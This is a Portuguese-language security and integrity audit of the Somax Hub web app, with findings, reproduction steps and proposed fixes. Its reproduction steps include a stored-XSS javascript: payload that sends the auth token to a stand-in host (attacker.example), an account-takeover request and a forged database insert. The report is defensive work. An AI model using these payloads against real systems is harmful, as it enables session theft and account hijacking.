# Relatório de Auditoria Completa do Sistema — Somax Hub

> **Data da Auditoria:** 17 de novembro de 2026  
> **Tipo de Auditoria:** Análise Estática, Arquitetural e de Integridade (Somente Leitura)  
> **Status de Execução:** Concluída sem alteração de código, migrations, dados ou configurações  
> **Versão do Sistema:** Somax Hub v0.1.0  
> **Documento:** `docs/auditoria-sistema-2026-11-17.md`  

---

## 1. Resumo Executivo

O **Somax Hub** passou por uma auditoria completa e aprofundada de código, schema de banco de dados, políticas de segurança (RLS), Edge Functions, integridade referencial, concordância lógica e cobertura operacional. A análise foi conduzida sob o padrão dos papéis de engenharia definidos em `AGENTS.md` (Orquestrador, Analista de Requisitos, Arquiteto, Banco de Dados e RLS, Back-end, Front-end, QA / Testes, Segurança e Privacidade, Revisor de Código, DevOps e Documentação).

### Notas Gerais por Área

| Área de Avaliação | Classificação | Justificativa Sintética |
| :--- | :---: | :--- |
| **Segurança e Privacidade** | **Atenção** | RLS ativo em 100% das tabelas, mas há uma falha crítica de autorização no endpoint `manage-user` (risco de sequestro de conta do Master Admin), políticas permissivas em eventos de linhagem (`with check (true)`), stored XSS potencial em links de clientes externos e CORS irrestrito em Edge Functions. |
| **Banco de Dados e Integridade** | **Atenção** | Schema relacional rico e robusto, mas com dependências órfãs potenciais em `tasks.stage_id` pela ausência de FK/trigger em estágios customizados, exclusão de cliente no banco sem validação de demandas vinculadas (regra existe apenas no front-end) e timestamps duplicados em migrations. |
| **Concordância do Sistema** | **Atenção** | Suíte de testes excelente (224/224 testes passando), mas há divergência estrutural severa: a documentação e o banco criaram a procedure `get_board_report_metrics` para relatórios, porém o front-end nunca a chama e calcula tudo em memória sobre uma lista truncada de 50 tarefas; listeners Realtime para 4 tabelas sem publicação no banco. |
| **Completude e Prontidão Operacional** | **Atenção** | Inexistência de pipeline de CI/CD, ausência de ambientes segregados (dev/homolog/prod), ausência de trilha de auditoria para clientes/usuários e hard deletes sem lixeira/soft-delete. |

---

### Os 5 Principais Riscos Mais Urgentes

1. **[SEG-01] Sequestro de Conta do Master Admin via Edge Function `manage-user` (Crítica):**  
   Qualquer usuário com papel de `administrador` regular pode disparar a Edge Function `manage-user` apontando para o `user_id` do administrador master com um `temporary_password` e novo `email`. A função usa `service_role` e invoca `admin.auth.admin.updateUserById`, alterando as credenciais de acesso do master no Supabase Auth. A trigger do PostgreSQL `guard_master_profile` protege apenas a tabela `public.profiles`, deixando `auth.users` desprotegido contra chamadas `service_role`.
2. **[SEG-03] Stored XSS via Protocolo Malicioso em Links de Clientes (Alta):**  
   O formulário público de auto-cadastro (`PublicClientRegistrationPage.tsx`) aceita qualquer string na URL (ex: `javascript:...`). O modal de perfil de clientes (`ClientProfileModal.tsx`) renderiza o link diretamente como `<a href={link.url} target="_blank">`. Se um gestor ou administrador clicar em "Acessar", o script roda no contexto da sessão administrativa no navegador.
3. **[CONC-01] Relatórios Calculados sobre Amostra Parcial e Inoperância da RPC Canônica (Alta):**  
   A migration `202611110002` criou a procedure `get_board_report_metrics` com `SECURITY INVOKER` para consolidar métricas com precisão no PostgreSQL. Contudo, `ReportsPage.tsx` nunca invoca esta procedure; calcula métricas em JavaScript sobre `data.tasks`, que no `App.tsx` é carregado com limite estático de 50 registros (`.limit(50)`). Em uma base real com mais de 50 tarefas, os relatórios executivos estarão incompletos e distorcidos.
4. **[SEG-02] RLS Aberta para Escrita e Leitura em `task_lineage_events` (Alta):**  
   As políticas `task_lineage_events_select` (`using (true)`) e `task_lineage_events_insert` (`with check (true)`) permitem que qualquer colaborador leia todas as jornadas de tarefas interdepartamentais e insira eventos forjados no histórico.
5. **[BD-02] Burlar a Regra de Exclusão de Clientes com Demandas Diretamente no Banco (Alta):**  
   A trava que impede excluir clientes com tarefas ativas foi implementada apenas na camada de apresentação (`AdminPages.tsx`). No PostgreSQL, a foreign key `tasks_client_id_fkey` foi configurada como `ON DELETE SET NULL` e a política `clients_delete` autoriza `DELETE` direto por administradores. Uma exclusão via API do Supabase remove o cliente e deixa suas tarefas órfãs sem nenhum aviso.

---

### O Que Está Bem Feito no Sistema

- **Isolamento de Demonstração Impecável:** O modo local (`src/demo.ts`) é 100% autônomo, não faz chamadas de rede e simula perfeitamente todas as regras de transição, quadros Scrum, limites WIP e exportação.
- **RLS Ativo em 100% das Tabelas:** Todas as 24 tabelas possuem Row Level Security ativado e políticas configuradas.
- **Proteção de Rascunhos no Navegador:** O módulo `src/drafts.ts` implementa sanitização estrita, descartando senhas, chaves de API e campos sensíveis de integração antes de gravar no `localStorage`, além de possuir expiração de 24 horas e expurgo no logout manual.
- **Sanitização de Injeção de Fórmulas CSV:** Os exportadores (`client-export.ts` e `reports.ts`) tratam prefixos perigosos (`=`, `+`, `-`, `@`) adicionando aspas simples de escape e utilizam BOM UTF-8 (`\uFEFF`) para compatibilidade perfeita com Excel no Brasil.
- **Qualidade de Testes:** 224 testes automatizados em 20 arquivos Vitest cobrem de ponta a ponta lógica de relatórios, contraste WCAG, limites WIP, ordenação e concorrência de quadros.
- **Compilação Estrita TypeScript:** O build de produção (`tsc -b && vite build`) roda perfeitamente sem nenhum erro ou aviso de tipo.

---

## 2. Escopo, Método e Limitações

### Escopo Auditado
1. **Migrations SQL:** 34 arquivos em `supabase/migrations/` e scripts na pasta `supabase/`.
2. **Back-end & Serverless:** Supabase Edge Functions (`invite-user` e `manage-user`).
3. **Front-end:** 24 arquivos `.tsx` e `.ts` em `src/`, incluindo páginas administrativas, detalhes de tarefas, chat, modais, exportadores e utilitários.
4. **Testes Automatizados:** 20 suítes Vitest em `src/*.test.*`.
5. **Documentação e Arquitetura:** `AGENTS.md`, `README.md`, `RELATORIO_DO_SISTEMA.md` e `docs/decisoes.md`.

### Método Empregado
- **Auditoria Estática de Código e Diffs:** Inspeção linha a linha de rotas, funções, componentes e consultas do cliente Supabase.
- **Auditoria de Políticas RLS e Triggers:** Mapeamento de todas as políticas `USING` e `WITH CHECK`, grants e definições `SECURITY DEFINER`/`INVOKER`.
- **Análise de Dependências e Vulnerabilidades:** Execução de `npm audit` e verificação de desatualização com `npm outdated`.
- **Verificação de Segredos e Histórico:** Inspeção de variáveis de ambiente em `.env`, `.env.example`, bundles e histórico completo de commits via `git log`.
- **Validação de Build e Testes:** Execução de `npm test` e `npm run build`.

### Limitações da Auditoria
- **Acesso ao Banco de Dados ao Vivo:** O ambiente local de desenvolvimento não contava com container Docker/PostgreSQL ativo em execução durante a auditoria. Por determinação estrita da Regra de Segurança 2 ("NÃO aplicar migrations, NÃO rodar db push/reset"), toda a checagem de banco foi efetuada através da leitura do catálogo estrutural das migrations SQL e da simulação com dados do `src/demo.ts`. Nenhuma escrita foi feita no banco.

---

## 3. Tabela Consolidada de Achados

### Critérios de Classificação de Severidade

- **Crítica:** Vulnerabilidade que permite comprometimento total da segurança, escalonamento de privilégio máximo, perda irreparável de integridade ou parada total de operação. Requer correção imediata.
- **Alta:** Falha de segurança que permite acesso a dados sensíveis de outras equipes (IDOR), quebra de integridade referencial por chamadas diretas ou inconsistência de dados com impacto direto no negócio.
- **Média:** Ausência de controle de defesa em profundidade, descompasso entre documentação e código, falta de índices em campos frequentemente filtrados, ou problemas de usabilidade em fluxos secundários.
- **Baixa:** Ajuste cosmético, limpeza de dependências ou melhoria de padronização sem risco operacional imediato.

| ID | Severidade | Status | Categoria | Onde (Arquivo:Linha ou Tabela) | Evidência | Impacto | Recomendação | Esforço |
| :--- | :---: | :---: | :---: | :--- | :--- | :--- | :--- | :---: |
| **SEG-01** | **Crítica** | Confirmado | Autenticação / Autorização | `supabase/functions/manage-user/index.ts:47-70` | Checagem de caller valida apenas se é administrador regular (`caller.role !== 'administrador'`), chamando `updateUserById` via `service_role` para alterar e-mail/senha do master. | Sequestro da conta do Administrador Master por qualquer outro administrador. | Validar no endpoint se o alvo é master e exigir que o chamador também seja `is_master`. | P |
| **SEG-02** | **Alta** | Confirmado | RLS / Autorização | `supabase/migrations/202611160001:61-67` | `create policy task_lineage_events_select ... using (true);` e `...insert ... with check (true);`. | Usuários de qualquer equipe podem ver histórico de tarefas restritas e forjar eventos de jornada. | Restringir SELECT via `can_access_task(task_id, auth.uid())` e remover INSERT direto pelo client. | P |
| **SEG-03** | **Alta** | Confirmado | Front-end / XSS | `src/PublicClientRegistrationPage.tsx:430`, `src/ClientProfileModal.tsx:642` | Formulário aceita `javascript:...` e modal renderiza `<a href={link.url} target="_blank">` sem validar schema HTTP. | Stored XSS contra administradores ao clicar em links externos cadastrados. | Sanitizar URLs aceitando estritamente `^https?://`. | P |
| **BD-01** | **Alta** | Confirmado | Integridade de Banco | `supabase/migrations/202611100009:5-7`, `202611100007:126` | Remoção de FK `tasks_stage_id_fkey` sem trigger de bloqueio de deleção em `board_stages`. | Gestor pode excluir etapa de quadro customizado deixando tarefas com `stage_id` órfão. | Criar trigger `before delete on board_stages` impedindo exclusão com tarefas associadas. | M |
| **BD-02** | **Alta** | Confirmado | Integridade de Banco | `supabase/migrations/202611130001:7-12`, `src/AdminPages.tsx:191-196` | FK em `tasks` alterada para `ON DELETE SET NULL`, e política `clients_delete` aberta para admin sem trigger restritivo. | Exclusão de cliente via API desconecta todas as suas tarefas no banco, violando a regra de negócio. | Adicionar trigger `before delete on public.clients` que verifica tarefas ativas. | P |
| **CONC-01** | **Alta** | Confirmado | Concordância / Arquitetura | `src/ReportsPage.tsx:1-1583`, `202611110002` | Procedure `get_board_report_metrics` existe no banco mas nunca é chamada no front; front calcula sobre 50 tarefas. | Relatórios mostram totais e gargalos truncados e incorretos quando o banco tem mais de 50 tarefas. | Integrar `ReportsPage` para invocar a RPC `get_board_report_metrics`. | M |
| **CONC-02** | **Alta** | Confirmado | Realtime / Sincronização | `src/App.tsx:388, 406-408`, `202611070001:292-294` | Front se inscreve no Realtime de `clients`, `boards`, `board_stages` e `sprints`, mas tabelas não estão na publication. | Modificações feitas por outros usuários nesses objetos não chegam via WebSocket. | Executar `alter publication supabase_realtime add table` para as 4 tabelas faltantes. | P |
| **FALTA-01** | **Alta** | Confirmado | DevOps / CI/CD | Raiz do repositório (`.github/` ausente) | Inexistência de pipeline de integração contínua para testes e verificação de migrations. | Risco de regressão silenciosa em merges na branch main. | Criar workflow de CI no GitHub Actions rodando `npm test` e `npm run build`. | P |
| **FALTA-02** | **Alta** | Confirmado | Trilha de Auditoria | Tabelas `clients`, `profiles`, `teams` | Apenas tarefas gravam histórico (`task_movements`). Alterações em dados mestres não têm log. | Falta de rastreabilidade para conformidade com a LGPD e investigações de segurança. | Implementar tabela genérica de auditoria de mutações administrativas. | M |
| **SEG-04** | **Média** | Confirmado | Storage / Sanitização | `supabase/migrations/202611070001:276-290` | Bucket `chat-private` não define `allowed_mime_types` (aceita .exe, .html, etc.). | Possibilidade de hospedar arquivos maliciosos e gerar lixo órfão no storage. | Definir lista estrita de MIME types aceitos e limitar tamanho por extensão. | P |
| **SEG-05** | **Média** | Confirmado | Anti-Bot / Enumeração | `supabase/migrations/202611110003:102-140` | Token de cadastro tem 16 hexadecimais em texto plano e RPC expõe status detalhado sem rate limit. | Risco de força bruta e enumeração de links ativos de clientes. | Hashear token (SHA-256), unificar mensagem de erro e aplicar rate limit na Edge. | M |
| **SEG-06** | **Média** | Confirmado | Edge Functions | `supabase/functions/invite-user/index.ts:3, 52` | `Access-Control-Allow-Origin: *` irrestrito e `catch` retornando `error.message` interno do PostgreSQL. | Requisições cross-origin indevidas e vazamento de mensagens internas de schema/erro. | Configurar CORS para origem específica do app e mascarar erros 500 genéricos. | P |
| **SEG-07** | **Média** | Confirmado | LGPD / Menor Privilégio | `supabase/migrations/202611090002_client_financial_details.sql` | `clients_read` permite que qualquer usuário autenticado veja dados de contato e notas financeiras. | Colaboradores de áreas não correlatas têm acesso a dados financeiros de clientes. | Isolar dados financeiros em tabela ou view protegida por RLS para perfil Financeiro/Admin. | M |
| **BD-03** | **Média** | Confirmado | Migrations | `supabase/migrations/` | Timestamps duplicados: `202611090002` (2 arquivos) e `202611100007` (2 arquivos). | Risco de ordenação não determinística na aplicação de migrations em novas máquinas/CI. | Renomear migrations futuras com timestamps estritamente sequenciais e unívocos. | P |
| **BD-04** | **Média** | Confirmado | Desempenho / Índices | Tabelas `tasks` | Ausência de índices em `client_id`, `created_at`, `completed_at` e `due_at` isolado. | Degradação de consultas com Seq Scan à medida que a tabela de tarefas crescer. | Criar índices B-tree nos 4 campos citados. | P |
| **BD-05** | **Média** | Confirmado | Hardening de Banco | `supabase/migrations/202611160001:70` | `check_forwarded_task_immutable` não define `set search_path`, e migration 202611110003 usa `public`. | Não conformidade com o padrão estrito de hardening `search_path = ''`. | Padronizar todas as funções para `set search_path = ''`. | P |
| **CONC-03** | **Média** | Confirmado | Concordância de Dados | `src/App.tsx:2092` | `completed(t, data.stages)` ignora etapas customizadas presentes em `data.boardStages`. | Tarefas concluídas em quadros personalizados somem da tela "Tarefas concluídas". | Passar `[...data.stages, ...data.boardStages]` para a função `completed`. | P |
| **CONC-04** | **Média** | Confirmado | Concordância Documental | `docs/decisoes.md:116-118` vs Banco | `decisoes.md` cita "Negociações", "Atividades em pausa", "Backlog Desenvolvimento". | Inconsistência entre especificação documental e schema de banco/demo.ts. | Atualizar `decisoes.md` com os nomes oficiais canônicos. | P |
| **FALTA-03** | **Média** | Confirmado | Resiliência Operacional | Operação e Infraestrutura | Falta de rotina documentada de backup e script de rollback (`down.sql`) de migrations. | Recuperação lenta e propensa a erros manuais em caso de falha grave. | Documentar procedimento padrão de pg_dump e criar scripts de contingência. | M |
| **FALTA-04** | **Média** | Confirmado | Governança de Dados | Tabelas `tasks`, `clients`, `boards` | Exclusões são definitivas (`DELETE` cascata ou desvinculação física). | Perda definitiva de demandas e histórico por exclusão acidental. | Implementar lixeira com exclusão lógica (`deleted_at`). | M |
| **FALTA-05** | **Média** | Confirmado | Higiene do Repositório | Pasta `supabase/` | Arquivos de dumps manuais versionados (`todas_migrations_somax_hub.sql`, `.zip`, etc.). | Confusão sobre fonte de verdade e poluição do versionamento. | Limpar scripts redundantes da pasta de migrations versionadas. | P |
| **CONC-05** | **Baixa** | Confirmado | Concordância Front-end | `src/lib.ts:213` | Verificação de bloqueio no bucket usa `stages.find` em vez de `allStages.find`. | Inconsistência cosmética caso quadros customizados usem status de pausa. | Substituir `stages.find` por `allStages.find`. | P |

---

## 4. Detalhamento dos Achados Críticos e Altos

### [SEG-01] Sequestro de Conta do Master Admin via Edge Function `manage-user`
- **Classificação:** Crítica | Status: Confirmado | Categoria: Autenticação / Autorização
- **Onde:** `supabase/functions/manage-user/index.ts:47-70`
- **Passo a Passo de Reprodução:**
  1. Autenticar no Somax Hub como um `administrador` comum (que não seja o master).
  2. Obter o JWT de sessão.
  3. Fazer uma requisição HTTP `POST` para `/functions/v1/manage-user` contendo:
     ```json
     {
       "user_id": "<UUID_DO_ADMINISTRADOR_MASTER>",
       "email": "hacker@somax.example",
       "full_name": "Administrador Master",
       "whatsapp": "+5511999990101",
       "role": "administrador",
       "active": true,
       "team_ids": ["..."],
       "temporary_password": "NovaSenhaForte123!"
     }
     ```
  4. A Edge Function valida que o chamador é `administrador` na linha 49 (`caller.role !== 'administrador'`), mas NÃO valida se o `user_id` alvo possui `is_master = true`.
  5. A linha 69 executa `admin.auth.admin.updateUserById(userId, authUpdates)` usando a `SUPABASE_SERVICE_ROLE_KEY`.
  6. A senha e o e-mail do Master Admin no Supabase Auth são imediatamente alterados para os dados informados pelo atacante.
- **Correção Proposta:**
  No arquivo `supabase/functions/manage-user/index.ts`, validar se o usuário alvo é master e se o chamador possui `is_master`:
  ```typescript
  // Obter dados do usuário que está sendo editado
  const { data: targetProfile, error: targetError } = await admin
    .from('profiles')
    .select('role, is_master')
    .eq('id', userId)
    .single()

  if (targetError || !targetProfile) {
    return response({ error: 'Usuário alvo não encontrado' }, 404)
  }

  // Se o usuário alvo for Master, SOMENTE ele próprio pode se gerenciar
  if (targetProfile.is_master && auth.user.id !== userId) {
    return response({ error: 'Apenas o próprio Administrador Master pode editar seu perfil' }, 403)
  }

  // Administrador comum não pode promover ninguém a Administrador nem alterar outro Administrador
  if (!caller.is_master) {
    if (role === 'administrador' && targetProfile.role !== 'administrador') {
      return response({ error: 'Apenas o Administrador Master pode promover novos administradores' }, 403)
    }
    if (targetProfile.role === 'administrador' && auth.user.id !== userId) {
      return response({ error: 'Administradores comuns não podem alterar outros administradores' }, 403)
    }
  }
  ```

---

### [SEG-02] RLS Permissiva (`USING (true)` e `WITH CHECK (true)`) em `task_lineage_events`
- **Classificação:** Alta | Status: Confirmado | Categoria: Row Level Security
- **Onde:** `supabase/migrations/202611160001_consolidated_forwarding_and_lineage.sql:61-67`
- **Passo a Passo de Reprodução:**
  1. Autenticar como colaborador de uma equipe (ex: Design).
  2. Executar via cliente Supabase:
     ```javascript
     const { data } = await supabase.from('task_lineage_events').select('*')
     ```
  3. A query retorna com sucesso 100% dos eventos de encaminhamento de tarefas do sistema, inclusive de equipes privadas (Financeiro, Comercial) que o usuário não tem permissão de visualizar.
  4. Executar inserção forjada:
     ```javascript
     await supabase.from('task_lineage_events').insert({
       task_id: '<ID_TAREFA_FINANCEIRA>',
       root_task_id: '<ID_ROOT>',
       board_name: 'Quadro Falso',
       stage_name: 'Concluído',
       event_type: 'forwarded'
     })
     ```
  5. A inserção tem sucesso imediato devido a `with check (true)`.
- **Correção Proposta (Nova Migration Sequencial):**
  ```sql
  -- Remover política permissiva de select
  drop policy if exists task_lineage_events_select on public.task_lineage_events;
  create policy task_lineage_events_select on public.task_lineage_events
    for select to authenticated
    using (public.can_access_task(task_id, auth.uid()));

  -- Remover política de insert direto pelo cliente (inserção apenas via RPC)
  drop policy if exists task_lineage_events_insert on public.task_lineage_events;
  ```

---

### [SEG-03] Stored XSS via Protocolo Malicioso em Links Úteis de Clientes
- **Classificação:** Alta | Status: Confirmado | Categoria: Front-end / XSS
- **Onde:** `src/PublicClientRegistrationPage.tsx:430-435` e `src/ClientProfileModal.tsx:642-651`
- **Passo a Passo de Reprodução:**
  1. Acessar a página de auto-cadastro com token válido: `/cadastro/<token>`.
  2. Na seção "Canais e Links Úteis", adicionar um link com:
     - Rótulo: "Portal do Cliente"
     - URL: `javascript:alert(document.cookie)` ou `javascript:window.location='https://attacker.example?data='+encodeURIComponent(localStorage.getItem('supabase.auth.token'))`
  3. Enviar o formulário. O payload é aceito e gravado em `client_registration_submissions`.
  4. O gestor aprova o cadastro e o cliente é inserido em `public.clients`.
  5. Qualquer operador abre a ficha do cliente (`ClientProfileModal.tsx`) e clica no botão "Acessar" ao lado do link.
  6. O navegador interpreta o protocolo `javascript:` e executa o código no contexto da aplicação.
- **Correção Proposta:**
  1. Sanitizar a URL no momento da inserção e edição em `PublicClientRegistrationPage.tsx` e `AdminPages.tsx`:
     ```typescript
     function isValidHttpUrl(stringUrl: string): boolean {
       try {
         const parsed = new URL(stringUrl)
         return parsed.protocol === 'http:' || parsed.protocol === 'https:'
       } catch {
         return false
       }
     }
     ```
  2. Blindar a renderização em `ClientProfileModal.tsx`:
     ```tsx
     const safeUrl = /^https?:\/\//i.test(link.url.trim()) ? link.url.trim() : '#'
     return (
       <a
         href={safeUrl}
         target="_blank"
         rel="noopener noreferrer"
         onClick={e => { if (safeUrl === '#') { e.preventDefault(); notify('Link inválido ou inseguro.'); } }}
       >
     ```

---

### [BD-01] Desvinculação de FK sem Triggers em `board_stages`
- **Classificação:** Alta | Status: Confirmado | Categoria: Integridade de Banco
- **Onde:** `supabase/migrations/202611100009_custom_board_stages_and_tasks.sql:5-7`
- **Passo a Passo de Reprodução:**
  1. Um gestor cria um quadro customizado com as etapas "A Fazer" e "Fazendo".
  2. Tarefas são criadas com `stage_id` apontando para "Fazendo".
  3. O gestor (ou uma chamada de API) executa:
     ```javascript
     await supabase.from('board_stages').delete().eq('id', stageFazendoId)
     ```
  4. Como a FK `tasks_stage_id_fkey` foi eliminada na migration `202611100009` e não foi criada trigger `BEFORE DELETE` na tabela `board_stages`, a etapa é excluída no banco.
  5. A tarefa permanece na tabela `tasks` apontando para um UUID inexistente, quebrando a renderização do Kanban e dos relatórios.
- **Correção Proposta (Nova Migration):**
  ```sql
  create or replace function public.guard_board_stage_delete()
  returns trigger language plpgsql security definer set search_path = '' as $$
  begin
    if exists(select 1 from public.tasks where stage_id = old.id) then
      raise exception 'Não é possível excluir esta etapa pois existem tarefas vinculadas a ela. Mova as tarefas antes de excluir.';
    end if;
    return old;
  end $$;

  drop trigger if exists trg_guard_board_stage_delete on public.board_stages;
  create trigger trg_guard_board_stage_delete
    before delete on public.board_stages
    for each row execute function public.guard_board_stage_delete();
  ```

---

### [BD-02] Burlar a Regra de Negócio de Exclusão de Clientes com Demandas
- **Classificação:** Alta | Status: Confirmado | Categoria: Integridade de Banco / Regra de Negócio
- **Onde:** `supabase/migrations/202611130001_tasks_client_id_on_delete_set_null.sql:7-12` e `src/AdminPages.tsx:191-196`
- **Passo a Passo de Reprodução:**
  1. Identificar um cliente que possui 5 tarefas vinculadas a ele.
  2. Tentar excluir pela tela: o botão no front-end bloqueia exibindo a mensagem: `"Este cliente tem 5 demandas vinculadas..."`.
  3. Executar diretamente via SDK autenticado como administrador:
     ```javascript
     await supabase.from('clients').delete().eq('id', clientId)
     ```
  4. O PostgreSQL aceita a deleção, pois a migration `202611130001` alterou a restrição para `ON DELETE SET NULL`.
  5. O cliente é apagado e todas as 5 tarefas têm seu campo `client_id` alterado silenciosamente para `NULL`.
- **Correção Proposta (Nova Migration):**
  ```sql
  create or replace function public.guard_client_delete()
  returns trigger language plpgsql security definer set search_path = '' as $$
  begin
    if exists(select 1 from public.tasks where client_id = old.id) then
      raise exception 'Este cliente possui demandas vinculadas e não pode ser excluído diretamente. Reatribua ou conclua as demandas primeiro.';
    end if;
    return old;
  end $$;

  drop trigger if exists trg_guard_client_delete on public.clients;
  create trigger trg_guard_client_delete
    before delete on public.clients
    for each row execute function public.guard_client_delete();
  ```

---

### [CONC-01] Relatórios Calculados sobre Amostra Parcial e Inoperância da RPC Canônica
- **Classificação:** Alta | Status: Confirmado | Categoria: Concordância e Arquitetura
- **Onde:** `src/ReportsPage.tsx:1-1583`, `src/App.tsx:230`, `supabase/migrations/202611110002_reports_board_concordance.sql:7-187`
- **Evidência no Código:**
  Em `src/App.tsx`:
  ```typescript
  supabase.from('tasks').select('*').order('created_at', { ascending: false }).limit(50)
  ```
  Em `src/ReportsPage.tsx`:
  ```typescript
  const report = useMemo(() => buildReportModel(
    data.tasks, // Apenas os 50 registros carregados acima!
    data.stages,
    filters,
    today,
    data.boardStages,
    allBoards
  ), [data.tasks, ...])
  ```
  Enquanto a procedure `public.get_board_report_metrics` criada especificamente para os relatórios na migration `202611110002` permanece órfã, sem nenhuma chamada em todo o front-end.
- **Impacto:** Falsa sensação de controle operacional. Indicadores de pontualidade, velocidade de entrega e gargalos WIP passam a analisar apenas as tarefas recentes, ignorando o passivo real de demandas do sistema.
- **Correção Proposta:**
  Atualizar `ReportsPage.tsx` para chamar a procedure via RPC quando conectado ao Supabase:
  ```typescript
  const { data: serverReport, error } = await supabase.rpc('get_board_report_metrics', {
    p_board_id: activeBoardId || 'all',
    p_from: filters.from || null,
    p_to: filters.to || null,
    p_team_id: filters.teamId || null,
  })
  ```
  Mantendo o cálculo em memória de `reports.ts` como fallback exclusivo para o modo de demonstração (`demoMode`).

---

## 5. Pontos Positivos e Controles que Já Funcionam

1. **Blindagem do Modo Demonstração (`src/demo.ts`):**  
   O modo demo opera com fidelidade absoluta de estado, permitindo que a aplicação seja testada sem necessidade de servidor Supabase ou acesso à rede.
2. **Sanitização de Rascunhos (`src/drafts.ts`):**  
   O rascunho de formulários em `localStorage` passa por uma expressão regular que remove chaves com palavras como `password`, `token`, `secret`, `key` e dados de integração de clientes.
3. **Escaping contra CSV Injection:**  
   As funções `clientCsvCell` e `reportCsvCell` neutralizam ataques de formula injection (`=`, `+`, `-`, `@`) inserindo apóstrofo inicial e escapando aspas duplas, além de fornecer o cabeçalho `\uFEFF` (BOM UTF-8) para exibição correta de acentuação no Microsoft Excel.
4. **Isolamento de Canais e Mensagens Privadas:**  
   A criação de canais e o envio de mensagens respeitam rigorosamente a associação ativa de membros às equipes (`can_access_channel`).
5. **Auditoria de Linhagem e Prevenção de Ciclos em Tarefas:**  
   A função `forward_completed_task` bloqueia re-encaminhamentos para quadros que já integraram a jornada da tarefa (`root_task_id`), evitando loops infinitos entre setores.
6. **Contraste e Acessibilidade Visual:**  
   45 testes automatizados no arquivo `theme-contrast.test.ts` asseguram proporção de contraste mínima de 4.5:1 (WCAG AA) para todos os tokens de cor tanto no tema claro quanto no tema escuro.

---

## 6. Análise de Lacunas (Gaps) e Melhorias Propostas

| Item | Área | Descrição da Lacuna | Impacto | Prioridade |
| :--- | :--- | :--- | :---: | :---: |
| **Pipeline de CI/CD** | DevOps | Não há automação para rodar `npm test`, `npm run build` e linters a cada Pull Request. | Alto | **P1 (Urgente)** |
| **Trilha de Auditoria Geral** | Segurança / LGPD | Somente tarefas registram auditoria. Edições de clientes, criação de usuários e alterações de permissões não têm log. | Alto | **P1 (Urgente)** |
| **Lixeira e Soft Delete** | Governança | Exclusões são imediatas e definitivas (`DELETE` cascata). Demandas apagadas acidentalmente são irrecuperáveis. | Alto | **P2 (Importante)** |
| **Ambientes Segregados** | DevOps | O repositório possui apenas um arquivo `.env` para a base geral. Faltam diretrizes para ambientes de Homologação e Produção. | Médio | **P2 (Importante)** |
| **Estratégia de Backup & Rollback** | DevOps / DB | Não existem scripts de migração reversa (`down.sql`) nem agendamento automatizado de dump lógico do banco. | Médio | **P2 (Importante)** |
| **Notificações Externas** | Funcionalidade | Inexistência de disparos de e-mail (Resend/SMTP) ou WhatsApp para avisar responsáveis sobre novas demandas ou prazos vencidos. | Médio | **P3 (Desejável)** |
| **Importação em Lote de Dados** | Funcionalidade | Há apenas exportação de clientes para CSV; não há mecanismo de carga em massa de clientes ou tarefas via planilha. | Médio | **P3 (Desejável)** |
| **Configurações Globais da Organização** | Governança | Logotipo, nome da empresa e regras operacionais estão fixadas no código-fonte, sem tela administrativa própria. | Baixo | **P3 (Desejável)** |

---

## 7. Plano de Correção em Ondas

```mermaid
flowchart LR
    subgraph ONDA1["Onda 1: Urgente (Segurança e Integridade)"]
        direction TB
        W1_1["SEG-01: Proteger Master Admin em manage-user"]
        W1_2["SEG-02: Fechar RLS de task_lineage_events"]
        W1_3["SEG-03: Sanitizar URLs em links de clientes"]
        W1_4["BD-01 & BD-02: Triggers de integridade (Etapas e Clientes)"]
        W1_5["FALTA-01: Implementar GitHub Actions CI"]
    end

    subgraph ONDA2["Onda 2: Concordância e Sincronização"]
        direction TB
        W2_1["CONC-01: Ligar ReportsPage à RPC get_board_report_metrics"]
        W2_2["CONC-02: Publicar tabelas faltantes no Realtime"]
        W2_3["CONC-03: Corrigir filtro de tarefas concluídas no front"]
        W2_4["BD-04: Adicionar índices de performance em tasks"]
        W2_5["SEG-06: Restringir CORS e mascarar erros das Edge Functions"]
    end

    subgraph ONDA3["Onda 3: Governança, LGPD e Resiliência"]
        direction TB
        W3_1["SEG-07 & FALTA-02: Isolar dados financeiros e criar Audit Trail"]
        W3_2["FALTA-04: Implementar Soft Delete e Lixeira de 30 dias"]
        W3_3["SEG-04 & SEG-05: Hardening de Storage e Anti-Bot com Hash SHA-256"]
        W3_4["FALTA-03 & FALTA-05: Limpeza de scripts legados e rotinas de backup"]
    end

    ONDA1 --> ONDA2 --> ONDA3
```



### Detalhamento das Ondas e Estimativas de Esforço

- **Onda 1 — Segurança e Integridade Imediata (Estimativa: 2 a 3 dias úteis):**
  1. Atualizar Edge Function `manage-user` com validações estritas de `is_master`.
  2. Criar nova migration sequencial corrigindo as políticas RLS de `task_lineage_events`.
  3. Aplicar sanitização de URLs com verificação de protocolo HTTP/HTTPS nos formulários e modais.
  4. Adicionar triggers de banco para impedir deleção de `board_stages` com tarefas e de `clients` com demandas.
  5. Configurar pipeline no GitHub Actions (`.github/workflows/ci.yml`) rodando `vitest run` e `tsc -b`.

- **Onda 2 — Concordância e Desempenho (Estimativa: 3 a 4 dias úteis):**
  1. Conectar `ReportsPage.tsx` à procedure SQL `get_board_report_metrics`, mantendo agregação em memória apenas no modo demo.
  2. Adicionar `clients`, `boards`, `board_stages` e `sprints` à publicação do Supabase Realtime via migration.
  3. Corrigir a visualização de "Tarefas Concluídas" no front-end para contemplar `boardStages`.
  4. Adicionar índices B-tree em `tasks(client_id)`, `tasks(created_at)`, `tasks(completed_at)` e `tasks(due_at)`.
  5. Ajustar CORS e mensagens de erro das Edge Functions.

- **Onda 3 — Governança e Evolução de Plataforma (Estimativa: 5 a 7 dias úteis):**
  1. Modelar tabela `audit_logs` e aplicar triggers de auditoria em mutações críticas de cadastros.
  2. Restringir acesso a dados financeiros de clientes a usuários do perfil `Financeiro` ou administradores.
  3. Adicionar coluna `deleted_at` para soft delete de tarefas e clientes.
  4. Implementar rotina de backup lógico e limpeza dos scripts monolíticos legados da pasta `supabase/`.

---

## 8. Perguntas em Aberto

Conforme a Regra de Segurança 5 da auditoria, as dúvidas identificadas foram consolidadas abaixo para alinhamento com a gestão do produto:

1. **Visibilidade de Dados Financeiros de Clientes:** É requisito de negócio que qualquer colaborador da empresa (ex: designers e desenvolvedores) visualize informações de vencimento, notas financeiras e contatos de cobrança de clientes, ou esses dados devem ficar restritos aos papéis de Administrador e membros da equipe Financeiro?
2. **Comportamento Esperado na Exclusão de Clientes:** A decisão formal de negócio é impedir estritamente a exclusão de clientes enquanto houver tarefas (mesmo concluídas), ou deve ser permitido arquivar o cliente com todas as suas tarefas através de um status inativo / soft delete?
